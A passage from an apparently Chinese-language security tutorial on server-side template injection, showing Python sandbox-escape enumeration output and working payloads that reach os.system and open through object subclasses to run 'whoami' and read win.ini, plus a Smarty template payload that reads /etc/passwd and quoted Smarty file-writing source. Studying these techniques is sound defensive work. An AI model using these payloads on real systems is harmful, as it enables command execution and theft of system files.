138 7 &lt;class 'types._GeneratorWrapper'&gt; __import__
138 7 &lt;class 'types._GeneratorWrapper'&gt; open
139 7 &lt;class 'warnings.WarningMessage'&gt; exec
139 7 &lt;class 'warnings.WarningMessage'&gt; eval
139 7 &lt;class 'warnings.WarningMessage'&gt; compile
139 7 &lt;class 'warnings.WarningMessage'&gt; __import__
139 7 &lt;class 'warnings.WarningMessage'&gt; open
140 7 &lt;class 'warnings.catch_warnings'&gt; exec
140 7 &lt;class 'warnings.catch_warnings'&gt; eval
140 7 &lt;class 'warnings.catch_warnings'&gt; compile
140 7 &lt;class 'warnings.catch_warnings'&gt; __import__
140 7 &lt;class 'warnings.catch_warnings'&gt; open
167 7 &lt;class 'reprlib.Repr'&gt; exec
167 7 &lt;class 'reprlib.Repr'&gt; eval
167 7 &lt;class 'reprlib.Repr'&gt; compile
167 7 &lt;class 'reprlib.Repr'&gt; __import__
167 7 &lt;class 'reprlib.Repr'&gt; open
174 7 &lt;class 'functools.partialmethod'&gt; exec
174 7 &lt;class 'functools.partialmethod'&gt; eval
174 7 &lt;class 'functools.partialmethod'&gt; compile
174 7 &lt;class 'functools.partialmethod'&gt; __import__
174 7 &lt;class 'functools.partialmethod'&gt; open
176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; exec
176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; eval
176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; compile
176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; __import__
176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; open
177 7 &lt;class 'contextlib._BaseExitStack'&gt; exec
177 7 &lt;class 'contextlib._BaseExitStack'&gt; eval
177 7 &lt;class 'contextlib._BaseExitStack'&gt; compile
177 7 &lt;class 'contextlib._BaseExitStack'&gt; __import__
177 7 &lt;class 'contextlib._BaseExitStack'&gt; open
----------4-----------
140 exec
140 eval
140 compile
140 __import__
140 open<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>筛选出来的模块还是很多，每个分块中，不用的部分代表利用不同的方式，为了更方便的利用进一步筛选具有更直接利用方式的类，关注再命令执行和读写上</p>
<pre class="line-numbers language-none"><code class="language-none">----------2-----------                                      
103 &lt;class 'codecs.IncrementalEncoder'&gt; open None           
104 &lt;class 'codecs.IncrementalDecoder'&gt; open None           
105 &lt;class 'codecs.StreamReaderWriter'&gt; open None           
106 &lt;class 'codecs.StreamRecoder'&gt; open None                
128 &lt;class 'os._wrap_close'&gt; open None                      
----------3-----------                                      
75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; open           
75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; exec           
76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; open      
76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; exec      
77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; open    
77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; exec    
78 5 &lt;class '_frozen_importlib._installed_safely'&gt; open     
78 5 &lt;class '_frozen_importlib._installed_safely'&gt; exec     
79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; open            
79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; exec            
91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; open   
91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; exec   
92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; open
92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; exec
93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; open
93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; exec
95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; open   
95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; exec   
103 7 &lt;class 'codecs.IncrementalEncoder'&gt; open              
103 7 &lt;class 'codecs.IncrementalEncoder'&gt; exec              
103 56 &lt;class 'codecs.IncrementalEncoder'&gt; open             
104 7 &lt;class 'codecs.IncrementalDecoder'&gt; open              
104 7 &lt;class 'codecs.IncrementalDecoder'&gt; exec              
104 56 &lt;class 'codecs.IncrementalDecoder'&gt; open             
105 7 &lt;class 'codecs.StreamReaderWriter'&gt; open              
105 7 &lt;class 'codecs.StreamReaderWriter'&gt; exec              
105 56 &lt;class 'codecs.StreamReaderWriter'&gt; open             
106 7 &lt;class 'codecs.StreamRecoder'&gt; open                   
106 7 &lt;class 'codecs.StreamRecoder'&gt; exec                   
106 56 &lt;class 'codecs.StreamRecoder'&gt; open                  
128 1 &lt;class 'os._wrap_close'&gt; open                         
128 1 &lt;class 'os._wrap_close'&gt; exec                         
128 7 &lt;class 'os._wrap_close'&gt; open                         
128 7 &lt;class 'os._wrap_close'&gt; exec                         
128 11 &lt;class 'os._wrap_close'&gt; open                        
129 7 &lt;class '_sitebuiltins.Quitter'&gt; open                  
129 7 &lt;class '_sitebuiltins.Quitter'&gt; exec                  
130 7 &lt;class '_sitebuiltins._Printer'&gt; open                 
130 7 &lt;class '_sitebuiltins._Printer'&gt; exec                 
137 7 &lt;class 'types.DynamicClassAttribute'&gt; open            
137 7 &lt;class 'types.DynamicClassAttribute'&gt; exec            
138 7 &lt;class 'types._GeneratorWrapper'&gt; open                
138 7 &lt;class 'types._GeneratorWrapper'&gt; exec                
139 7 &lt;class 'warnings.WarningMessage'&gt; open                
139 7 &lt;class 'warnings.WarningMessage'&gt; exec                
140 7 &lt;class 'warnings.catch_warnings'&gt; open                
140 7 &lt;class 'warnings.catch_warnings'&gt; exec                
167 7 &lt;class 'reprlib.Repr'&gt; open                           
167 7 &lt;class 'reprlib.Repr'&gt; exec                           
174 7 &lt;class 'functools.partialmethod'&gt; open                
174 7 &lt;class 'functools.partialmethod'&gt; exec                
176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; open
176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; exec
177 7 &lt;class 'contextlib._BaseExitStack'&gt; open              
177 7 &lt;class 'contextlib._BaseExitStack'&gt; exec              
----------4-----------                                      
140 open                                                    
140 exec                                               <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>既然筛选出来，那么选其中一个利用来读取文件：</p>
<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; "".__class__.__bases__[0].__subclasses__()[103]
&lt;class 'codecs.IncrementalEncoder'&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>完整执行</p>
<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; "".__class__.__bases__[0].__subclasses__()[103].__init__.__globals__['open']("C:\\windows\\win.ini").read()
'; for 16-bit app support\n[fonts]\n[extensions]\n[mciextensions]\n[files]\n[Mail]\nMAPI=1\nCMCDLLNAME32=mapi32.dll\nCM
C=1\nMAPIX=1\nMAPIXVER=1.0.0.1\nOLEMessaging=1\n[xianshuabao]\nclient_uuid={xxx}\n'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>执行命令，此处如果使用原作者给的第三种利用代码在python3中会报错，python3中对于<code>dict.values</code>不再返回列表，而是返回view，不可索引的对象。</p>
<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; "".__class__.__bases__[0].__subclasses__()[103].__init__.__globals__['__builtins__']['eval']('__import__("os").system("whoami")')
misaki\user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h5 id="5-2-python2">5.2 python2</h5>
<p>python2.7的模块(252)</p>
<pre class="line-numbers language-none"><code class="language-none">bsddb
compiler
ctypes
curses
......
webbrowser.py
whichdb.py
wsgiref.egg-info
xdrlib.py
xmllib.py
xmlrpclib.py
zipfile.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>同样利用原代码进行筛选</p>
<pre class="line-numbers language-none"><code class="language-none">----------1-----------
(40, 'file')
----------2-----------
(59, &lt;class 'warnings.WarningMessage'&gt;, 'linecache', ['os', 'sys', '__builtins__'])
(59, &lt;class 'warnings.WarningMessage'&gt;, '__builtins__', None)
(59, &lt;class 'warnings.WarningMessage'&gt;, 'sys', None)
(59, &lt;class 'warnings.WarningMessage'&gt;, 'types', ['__builtins__'])
(60, &lt;class 'warnings.catch_warnings'&gt;, 'linecache', ['os', 'sys', '__builtins__'])
(60, &lt;class 'warnings.catch_warnings'&gt;, '__builtins__', None)
(60, &lt;class 'warnings.catch_warnings'&gt;, 'sys', None)
(60, &lt;class 'warnings.catch_warnings'&gt;, 'types', ['__builtins__'])
(61, &lt;class '_weakrefset._IterationGuard'&gt;, '__builtins__', None)
(62, &lt;class '_weakrefset.WeakSet'&gt;, '__builtins__', None)
(72, &lt;class 'site._Printer'&gt;, '__builtins__', None)
(72, &lt;class 'site._Printer'&gt;, 'traceback', ['sys', '__builtins__'])
(72, &lt;class 'site._Printer'&gt;, 'os', ['sys', '__builtins__', 'open'])
(72, &lt;class 'site._Printer'&gt;, 'sys', None)
(77, &lt;class 'site.Quitter'&gt;, '__builtins__', None)
(77, &lt;class 'site.Quitter'&gt;, 'traceback', ['sys', '__builtins__'])
(77, &lt;class 'site.Quitter'&gt;, 'os', ['sys', '__builtins__', 'open'])
(77, &lt;class 'site.Quitter'&gt;, 'sys', None)
(78, &lt;class 'codecs.IncrementalEncoder'&gt;, '__builtins__', None)
(78, &lt;class 'codecs.IncrementalEncoder'&gt;, 'sys', None)
(78, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open', None)
(79, &lt;class 'codecs.IncrementalDecoder'&gt;, '__builtins__', None)
(79, &lt;class 'codecs.IncrementalDecoder'&gt;, 'sys', None)
(79, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open', None)
----------3-----------
(59, 13, &lt;class 'warnings.WarningMessage'&gt;, '__import__')
(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'file')
(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'compile')
(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'eval')
(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'open')
(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'execfile')
(60, 13, &lt;class 'warnings.catch_warnings'&gt;, '__import__')
(60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'file')
(60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'compile')
(60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'eval')
(60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'open')
(60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'execfile')
(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, '__import__')
(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'file')
(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'compile')
(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'eval')
(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'open')
(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'execfile')
(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, '__import__')
(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'file')
(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'compile')
(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'eval')
(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'open')
(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'execfile')
(72, 20, &lt;class 'site._Printer'&gt;, 'file')
(72, 20, &lt;class 'site._Printer'&gt;, 'exec')
(72, 23, &lt;class 'site._Printer'&gt;, '__import__')
(72, 23, &lt;class 'site._Printer'&gt;, 'file')
(72, 23, &lt;class 'site._Printer'&gt;, 'compile')
(72, 23, &lt;class 'site._Printer'&gt;, 'eval')
(72, 23, &lt;class 'site._Printer'&gt;, 'open')
(72, 23, &lt;class 'site._Printer'&gt;, 'execfile')
(77, 20, &lt;class 'site.Quitter'&gt;, 'file')
(77, 20, &lt;class 'site.Quitter'&gt;, 'exec')
(77, 23, &lt;class 'site.Quitter'&gt;, '__import__')
(77, 23, &lt;class 'site.Quitter'&gt;, 'file')
(77, 23, &lt;class 'site.Quitter'&gt;, 'compile')
(77, 23, &lt;class 'site.Quitter'&gt;, 'eval')
(77, 23, &lt;class 'site.Quitter'&gt;, 'open')
(77, 23, &lt;class 'site.Quitter'&gt;, 'execfile')
(78, 21, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open')
(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, '__import__')
(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'file')
(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'compile')
(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'eval')
(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open')
(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'execfile')
(79, 21, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open')
(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, '__import__')
(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'file')
(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'compile')
(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'eval')
(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open')
(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'execfile')
----------4-----------
(60, '__import__')
(60, 'file')
(60, 'repr')
(60, 'compile')
(60, 'eval')
(60, 'open')
(60, 'execfile')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>进一步获取可以直接执行命令或者读取文件的类</p>
<pre class="line-numbers language-none"><code class="language-none">----------1-----------                                                                
(40, 'file')                                                                          
----------2-----------                                                                
(59, &lt;class 'warnings.WarningMessage'&gt;, 'linecache', ['os', 'sys', '__builtins__'])   
(59, &lt;class 'warnings.WarningMessage'&gt;, 'types', ['__builtins__'])                    
(60, &lt;class 'warnings.catch_warnings'&gt;, 'linecache', ['os', 'sys', '__builtins__'])   
(60, &lt;class 'warnings.catch_warnings'&gt;, 'types', ['__builtins__'])                    
(72, &lt;class 'site._Printer'&gt;, 'traceback', ['sys', '__builtins__'])                   
(72, &lt;class 'site._Printer'&gt;, 'os', ['sys', '__builtins__', 'open'])                  
(77, &lt;class 'site.Quitter'&gt;, 'traceback', ['sys', '__builtins__'])                    
(77, &lt;class 'site.Quitter'&gt;, 'os', ['sys', '__builtins__', 'open'])                   
(78, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open', None)                               
(79, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open', None)                               
----------3-----------                                                                
(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'file')                                   
(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'eval')                                   
(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'open')                                   
(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'execfile')                               
(60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'file')                                   
(60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'eval')                                   
(60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'open')                                   
(60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'execfile')                               
(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'file')                                
(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'eval')                                
(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'open')                                
(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'execfile')                            
(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'file')                                        
(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'eval')                                        
(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'open')                                        
(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'execfile')                                    
(72, 20, &lt;class 'site._Printer'&gt;, 'file')                                             
(72, 20, &lt;class 'site._Printer'&gt;, 'exec')                                             
(72, 23, &lt;class 'site._Printer'&gt;, 'file')                                             
(72, 23, &lt;class 'site._Printer'&gt;, 'eval')                                             
(72, 23, &lt;class 'site._Printer'&gt;, 'open')                                             
(72, 23, &lt;class 'site._Printer'&gt;, 'execfile')                                         
(77, 20, &lt;class 'site.Quitter'&gt;, 'file')                                              
(77, 20, &lt;class 'site.Quitter'&gt;, 'exec')                                              
(77, 23, &lt;class 'site.Quitter'&gt;, 'file')                                              
(77, 23, &lt;class 'site.Quitter'&gt;, 'eval')                                              
(77, 23, &lt;class 'site.Quitter'&gt;, 'open')                                              
(77, 23, &lt;class 'site.Quitter'&gt;, 'execfile')                                          
(78, 21, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open')                                 
(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'file')                                 
(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'eval')                                 
(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open')                                 
(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'execfile')                             
(79, 21, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open')                                 
(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'file')                                 
(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'eval')                                 
(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open')                                 
(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'execfile')                             
----------4-----------                                                                
(60, 'file')                                                                          
(60, 'repr')                                                                          
(60, 'eval')                                                                          
(60, 'open')                                                                          
(60, 'execfile')                         <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>选取其中一个执行命令，<code>__mro__</code>输出父类，最后一个父类为object</p>
<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; ().__class__.__mro__[-1].__subclasses__()[72]
&lt;class 'site._Printer'&gt;

&gt;&gt;&gt; ().__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__['os'].system('whoami')
misaki\user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>读取文件</p>
<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; ().__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__['__builtins__']['file']("C:\\windows\\win.ini").read()'; for 16-bit app support\n[fonts]\n[extensions]\n[mciextensions]\n[files]\n[Mail]\nMAPI=1\nCMCDLLNAME32=mapi32.dll\nCMC=1\nMAPIX=1\nMAPIXVER=1.0.0.1\nOLEMessagin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>其中还可以执行的模块还有很多，比如使用含有<code>__builtins__</code>的其他模块，来调用加载的os等。</p>
<p>筛选代码来源：<a target="_blank" rel="noopener" href="https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/#%E9%81%8D%E5%8E%86%E6%89%BE%E5%88%B0%E5%85%B6%E4%BB%96%E7%9A%84%E9%80%83%E9%80%B8%E6%96%B9%E6%B3%95">Python沙箱逃逸总结</a></p>
<p>参考：<a target="_blank" rel="noopener" href="https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#python2">https://misakikata.github.io/2020/04/python-沙箱逃逸与SSTI/#python2</a></p>
<h2 id="五、PHP-smarty模板">五、PHP-smarty模板</h2>
<p>Smarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function)</p>
<p>但是，实际上对语言的限制并不能影响我们执行命令，因为我们首先考虑的应该是模板本身，恰好 Smarty 很照顾我们，在阅读<a target="_blank" rel="noopener" href="https://github.com/smarty-php/smarty">模板的文档</a>以后我们发现：$smarty内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的的方法</p>
<p>smarty/libs/sysplugins/smarty_internal_data.php　　——&gt;　　getStreamVariable() 这个方法可以获取传入变量的流</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230623183303993.png" alt="image-20230623183303993"></p>
<p>这个函数流程大致为：打开你输入的文件$variable，判断文件名是否存在，存在的话在循环中读取到文件全部内容，赋值给变量result，如果不存在则看变量smarty，抛出不同问题，分别为，文件不存在或者文件内容为空</p>
<p>因此我们可以用这个方法读文件，payload:</p>
<pre class="line-numbers language-none"><code class="language-none">{self::getStreamVariable("file:///etc/passwd")}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>同样</p>
<p>smarty/libs/sysplugins/smarty_internal_write_file.php　　——&gt;　　Smarty_Internal_Write_File 这个类中有一个writeFile方法</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Smarty_Internal_Write_File</span>
<span class="token punctuation">{</span>
    <span class="token comment">/**
     * Writes file in a safe way to disk
     *
     * @param  string $_filepath complete filepath
     * @param  string $_contents file content
     * @param  Smarty $smarty    smarty instance
     *
     * @throws SmartyException
     * @return boolean true
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">writeFile</span><span class="token punctuation">(</span><span class="token variable">$_filepath</span><span class="token punctuation">,</span> <span class="token variable">$_contents</span><span class="token punctuation">,</span> <span class="token class-name type-declaration">Smarty</span> <span class="token variable">$smarty</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$_error_reporting</span> <span class="token operator">=</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token variable">$_error_reporting</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token constant">E_NOTICE</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token constant">E_WARNING</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$smarty</span><span class="token operator">-&gt;</span><span class="token property">_file_perms</span> <span class="token operator">!==</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$old_umask</span> <span class="token operator">=</span> <span class="token function">umask</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$_dirpath</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// if subdirs, create dir structure</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_dirpath</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'.'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$_dirpath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$_dirpath</span><span class="token punctuation">,</span> <span class="token variable">$smarty</span><span class="token operator">-&gt;</span><span class="token property">_dir_perms</span> <span class="token operator">===</span> <span class="token constant">null</span> <span class="token operator">?</span> <span class="token number">0777</span> <span class="token punctuation">:</span> <span class="token variable">$smarty</span><span class="token operator">-&gt;</span><span class="token property">_dir_perms</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// write to tmp file, then move to overt file lock race condition</span>
        <span class="token variable">$_tmp_file</span> <span class="token operator">=</span> <span class="token variable">$_dirpath</span> <span class="token operator">.</span> <span class="token constant">DS</span> <span class="token operator">.</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">','</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'_'</span><span class="token punctuation">,</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'wrt'</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_tmp_file</span><span class="token punctuation">,</span> <span class="token variable">$_contents</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token variable">$_error_reporting</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SmartyException</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"unable to write file <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_tmp_file</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span>

        <span class="token comment">/*
         * Windows' rename() fails if the destination exists,
         * Linux' rename() properly handles the overwrite.
         * Simply unlink()ing a file might cause other processes
         * currently reading that file to fail, but linux' rename()
         * seems to be smart enough to handle that for us.
         */</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name static-context">Smarty</span><span class="token operator">::</span><span class="token variable">$_IS_WINDOWS</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// remove original file</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$_filepath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$_filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token comment">// rename tmp file</span>
            <span class="token variable">$success</span> <span class="token operator">=</span> @<span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$_tmp_file</span><span class="token punctuation">,</span> <span class="token variable">$_filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
